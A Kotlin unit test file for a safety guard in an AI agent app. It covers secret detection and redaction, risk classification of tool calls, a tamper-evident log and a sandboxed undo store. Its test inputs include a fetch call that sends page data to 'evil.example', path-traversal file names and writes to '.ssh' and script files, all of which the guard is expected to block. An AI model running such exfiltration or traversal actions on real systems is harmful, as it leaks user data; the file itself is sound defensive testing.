package com.swarmdeck.guard

import org.json.JSONObject
import org.junit.Assert.*
import org.junit.Rule
import org.junit.Test
import org.junit.rules.TemporaryFolder
import java.io.File

class GuardTest {
    @get:Rule
    val tmp = TemporaryFolder()

    private fun args(vararg kv: Pair<String, Any>): JSONObject {
        val o = JSONObject()
        kv.forEach { o.put(it.first, it.second) }
        return o
    }

    // ── SecretScan ──
    @Test
    fun luhnAcceptsRealCardAndRejectsRandom() {
        assertTrue(SecretScan.luhn("4111111111111111"))
        assertFalse(SecretScan.luhn("4111111111111112"))
    }

    @Test
    fun findsCardKeysPasswordsAndCodes() {
        assertTrue(SecretScan.kinds("my card is 4111 1111 1111 1111").contains("card number"))
        assertTrue(SecretScan.kinds("key sk-abcdefghijklmnopqrstuvwxyz123456").contains("API key"))
        assertTrue(SecretScan.kinds("my password is hunter2xyz").contains("password"))
        assertTrue(SecretScan.kinds("my otp is 482913").contains("one-time code"))
        assertTrue(SecretScan.kinds("ssn 123-45-6789").contains("SSN-like"))
        assertTrue(SecretScan.kinds("Authorization abcdEFGH1234abcdEFGH1234abcdEFGH1234abcdEF").contains("token"))
    }

    @Test
    fun ordinaryTextIsNotFlagged() {
        assertEquals("", SecretScan.kinds("Meet me at 5pm tomorrow, room 204. Call 555 1234."))
        assertEquals("", SecretScan.kinds("https://example.com/page?id=12&sort=asc"))
        assertEquals("", SecretScan.kinds("order number 1234 5678 9012 3456"))
    }

    @Test
    fun redactReplacesSecrets() {
        val r = SecretScan.redact("pay with 4111 1111 1111 1111 now")
        assertTrue(r.contains("[REDACTED:card number]"))
        assertFalse(r.contains("4111"))
        assertEquals("nothing here", SecretScan.redact("nothing here"))
    }

    // ── RiskClassifier ──
    @Test
    fun memorySaveBlocksSecretsOnly() {
        assertEquals(Risk.BLOCK, RiskClassifier.assess("memory_save", args("key" to "login", "value" to "password: hunter2xyz")).risk)
        assertEquals(Risk.NOTICE, RiskClassifier.assess("memory_save", args("key" to "pet", "value" to "has a cat named Mo")).risk)
        assertEquals(Risk.CONFIRM, RiskClassifier.assess("memory_save", args("key" to "pet", "value" to "cat"), GuardCtx(strict = true)).risk)
    }

    @Test
    fun fileWriteRules() {
        fun w(path: String, content: String = "hello world", ctx: GuardCtx = GuardCtx()) =
            RiskClassifier.assess("file_write", args("path" to path, "content" to content), ctx)
        assertEquals(Risk.BLOCK, w(".ssh/key").risk)
        assertEquals(Risk.BLOCK, w("tool.apk").risk)
        assertEquals(Risk.BLOCK, w("../x.txt").risk)
        assertEquals(Risk.BLOCK, w("run.sh").risk)
        assertEquals(Risk.BLOCK, w("").risk)
        assertEquals(Risk.NOTICE, w("notes.txt").risk)
        assertEquals(Risk.NOTICE, w("./docs/notes.txt").risk)
        assertEquals(Risk.CONFIRM, w("notes.txt", ctx = GuardCtx(fileExists = true, oldSize = 40)).risk)
        assertEquals(Risk.CONFIRM, w("notes.txt", ctx = GuardCtx(strict = true)).risk)
        val sec = w("notes.txt", "card 4111 1111 1111 1111")
        assertEquals(Risk.CONFIRM, sec.risk)
        assertFalse(sec.preview.contains("4111"))
    }

    @Test
    fun runCodeBlocksNetworkEscapes() {
        fun r(lang: String, code: String, strict: Boolean = false) =
            RiskClassifier.assess("run_code", args("language" to lang, "code" to code), GuardCtx(strict = strict)).risk
        assertEquals(Risk.BLOCK, r("js", "fetch('https://evil.example/?d='+document.title)"))
        assertEquals(Risk.BLOCK, r("javascript", "new WebSocket('wss://x')"))
        assertEquals(Risk.BLOCK, r("python", "import requests\nrequests.get('x')"))
        assertEquals(Risk.BLOCK, r("py", "from js import fetch"))
        assertEquals(Risk.NOTICE, r("js", "1+1"))
        assertEquals(Risk.NOTICE, r("sql", "select 1"))
        assertEquals(Risk.CONFIRM, r("js", "1+1", strict = true))
    }

    @Test
    fun urlAndSearchRules() {
        fun u(url: String, strict: Boolean = false) =
            RiskClassifier.assess("web_fetch", args("url" to url), GuardCtx(strict = strict)).risk
        assertEquals(Risk.SAFE, u("https://example.com/a?b=1"))
        assertEquals(Risk.CONFIRM, u("https://example.com/a?b=1", strict = true))
        assertEquals(Risk.BLOCK, u("https://example.com/?k=sk-abcdefghijklmnopqrstuvwxyz123456"))
        assertEquals(Risk.BLOCK, u("https://user:pass@example.com/"))
        assertEquals(Risk.BLOCK, u("https://example.com/?" + "q".repeat(400)))
        assertEquals(Risk.BLOCK, RiskClassifier.assess("web_search", args("query" to "word ".repeat(90))).risk)
        assertEquals(Risk.BLOCK, RiskClassifier.assess("web_search", args("query" to "my password is hunter2xyz")).risk)
        assertEquals(Risk.SAFE, RiskClassifier.assess("web_search", args("query" to "weather in Pune")).risk)
    }

    @Test
    fun typingSecretsIsBlockedEverywhere() {
        assertEquals(Risk.BLOCK, RiskClassifier.assess("phone_action", args("action" to "type", "text" to "4111111111111111")).risk)
        assertEquals(Risk.BLOCK, RiskClassifier.assess("browser_type", args("text" to "my otp is 482913")).risk)
        assertEquals(Risk.SAFE, RiskClassifier.assess("phone_action", args("action" to "open", "text" to "Maps")).risk)
        assertEquals(Risk.SAFE, RiskClassifier.assess("browser_click", args("text" to "Next")).risk)
    }

    @Test
    fun readOnlyUnknownAndStrictFallbacks() {
        assertEquals(Risk.SAFE, RiskClassifier.assess("file_read", args("path" to "a.txt")).risk)
        assertEquals(Risk.SAFE, RiskClassifier.assess("current_time", JSONObject()).risk)
        assertEquals(Risk.NOTICE, RiskClassifier.assess("brand_new_tool", JSONObject()).risk)
        assertEquals(Risk.CONFIRM, RiskClassifier.assess("brand_new_tool", JSONObject(), GuardCtx(strict = true)).risk)
        assertEquals(Risk.SAFE, RiskClassifier.assess("file_read", args("path" to "a.txt"), GuardCtx(strict = true)).risk)
        assertEquals(Risk.BLOCK, RiskClassifier.assess("generate_image", args("prompt" to "my password is hunter2xyz")).risk)
        assertEquals(Risk.NOTICE, RiskClassifier.assess("generate_image", args("prompt" to "a red fox")).risk)
    }

    @Test
    fun messagesExplainTheDecision() {
        val b = RiskClassifier.assess("file_write", args("path" to "x.apk", "content" to "x"))
        assertTrue(RiskClassifier.blockMessage(b).startsWith("BLOCKED by Zero-Trust"))
        assertTrue(RiskClassifier.blockMessage(b).contains(".apk"))
        val c = RiskClassifier.assess("file_write", args("path" to "x.txt", "content" to "abc"), GuardCtx(fileExists = true, oldSize = 9))
        assertTrue(RiskClassifier.approvalDetail(c).contains("Overwrites 9 B"))
    }

    // ── HashChain / GuardLog ──
    @Test
    fun chainVerifiesAndDetectsEditsDeletionsAndGarbage() {
        val f = File(tmp.root, "g.chain")
        val log = GuardLog(f)
        log.append("allow", "first", 1L)
        log.append("block", "second", 2L)
        log.append("deny", "third", 3L)
        assertEquals(-1, log.verify())

        val original = f.readText()
        f.writeText(original.replace("second", "forged"))
        assertEquals(1, log.verify())

        val lines = original.lines().filter { it.isNotBlank() }
        f.writeText(listOf(lines[0], lines[2]).joinToString("\n") + "\n")
        assertEquals(1, log.verify())

        f.writeText(original + "garbage\n")
        assertEquals(3, log.verify())
    }

    @Test
    fun chainRedactsSecretsAndKeepsIntegrity() {
        val log = GuardLog(File(tmp.root, "g2.chain"))
        log.append("block", "typed 4111111111111111 into field", 5L)
        val e = log.read().last()
        assertFalse(e.detail.contains("4111111111111111"))
        assertEquals(-1, log.verify())
    }

    @Test
    fun chainPrunesOldEntriesButStaysValid() {
        val log = GuardLog(File(tmp.root, "g3.chain"), maxLines = 3)
        for (i in 1..5) log.append("allow", "e$i", i.toLong())
        val l = log.read()
        assertEquals(3, l.size)
        assertEquals("e3", l.first().detail)
        assertEquals(-1, log.verify())
    }

    // ── UndoStore ──
    private fun dirs(): Pair<File, File> = Pair(tmp.newFolder("ws"), tmp.newFolder("undo"))

    @Test
    fun undoRestoresOverwrittenFile() {
        val (root, d) = dirs()
        val store = UndoStore(d)
        val f = File(root, "a.txt")
        f.writeText("old")
        val e = store.snapshotFile("g1", "a.txt", f, "wrote a.txt")!!
        f.writeText("new")
        val msg = store.undo(e.id, root) { _, _ -> 0 }
        assertEquals("old", f.readText())
        assertTrue(msg.startsWith("Restored"))
        assertTrue(store.list().isEmpty())
    }

    @Test
    fun undoDeletesFileThatDidNotExist() {
        val (root, d) = dirs()
        val store = UndoStore(d)
        val f = File(root, "new.txt")
        val e = store.snapshotFile("g1", "new.txt", f, "wrote new.txt")!!
        f.writeText("created")
        store.undo(e.id, root) { _, _ -> 0 }
        assertFalse(f.exists())
    }

    @Test
    fun undoGroupRollsBackInReverseOrder() {
        val (root, d) = dirs()
        val store = UndoStore(d)
        val f = File(root, "a.txt")
        f.writeText("v1")
        store.snapshotFile("run7", "a.txt", f, "w1")
        f.writeText("v2")
        store.snapshotFile("run7", "a.txt", f, "w2")
        f.writeText("v3")
        store.snapshotFile("other", "b.txt", File(root, "b.txt"), "w3")
        assertEquals("run7", store.list().last().group)
        store.undoGroup("run7", root) { _, _ -> 0 }
        assertEquals("v1", f.readText())
        assertEquals(1, store.list().size)
        assertEquals("other", store.list().first().group)
    }

    @Test
    fun undoNeverWritesOutsideSandbox() {
        val (root, d) = dirs()
        val store = UndoStore(d)
        val outside = File(tmp.root, "evil.txt")
        outside.writeText("x")
        val e = store.snapshotFile("g", "../evil.txt", outside, "bad")!!
        outside.writeText("changed")
        val msg = store.undo(e.id, root) { _, _ -> 0 }
        assertTrue(msg.startsWith("Refused"))
        assertEquals("changed", outside.readText())
    }

    @Test
    fun hugeExistingFilesAreNotSnapshotted() {
        val (root, d) = dirs()
        val store = UndoStore(d, maxBytes = 5)
        val f = File(root, "big.txt")
        f.writeText("0123456789")
        assertNull(store.snapshotFile("g", "big.txt", f, "x"))
    }

    @Test
    fun memoryUndoUsesDeleterAndPruningKeepsNewest() {
        val (root, d) = dirs()
        val store = UndoStore(d, maxEntries = 3)
        var seen = ""
        val e = store.recordMemory("g", "pet", "cat", "saved memory")
        val msg = store.undo(e.id, root) { k, v -> seen = "$k=$v"; 1 }
        assertEquals("pet=cat", seen)
        assertTrue(msg.startsWith("Removed"))
        val e2 = store.recordMemory("g", "k", "v", "saved")
        assertTrue(store.undo(e2.id, root) { _, _ -> 0 }.contains("already gone"))
        for (i in 1..5) store.recordMemory("g", "k$i", "v$i", "m$i")
        val ids = store.list().map { it.id }
        assertEquals(3, ids.size)
        assertEquals(ids.sortedDescending(), ids)
    }
}
